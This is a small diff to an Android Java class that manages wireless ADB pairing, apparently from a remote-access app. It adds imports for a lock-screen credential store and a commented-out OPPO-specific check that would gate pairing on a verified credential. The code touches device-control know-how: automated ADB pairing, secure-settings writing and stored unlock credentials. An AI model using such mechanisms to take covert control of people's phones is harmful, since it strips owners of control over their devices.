@@ -5,6 +5,8 @@ import android.os.Build;
 import android.util.Log;
 
 import com.vendor.rat.control.entity.ADBConfig;
+import com.vendor.rat.credential.LockCredentialStore;
+import com.vendor.rat.utils.DeviceUtils;
 import com.vendor.rat.utils.SecureSettingsWriter;
 
 import java.io.ByteArrayInputStream;
@@ -487,6 +489,12 @@ public final class AdbConnectionManager extends AbsAdbConnectionManager {
         try {
             // Already paired — nothing to do
             if (mPaired.get()) return;
+
+            // TODO: 恢复 ADB 自动化授权时取消注释
+            // if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+            //     Log.d(TAG, "triggerPairingIfNeeded: OPPO credential gate not verified, skip");
+            //     return;
+            // }
 
             // Already in progress
             if (WirelessPairEngine.isPairingInProgress()) return;
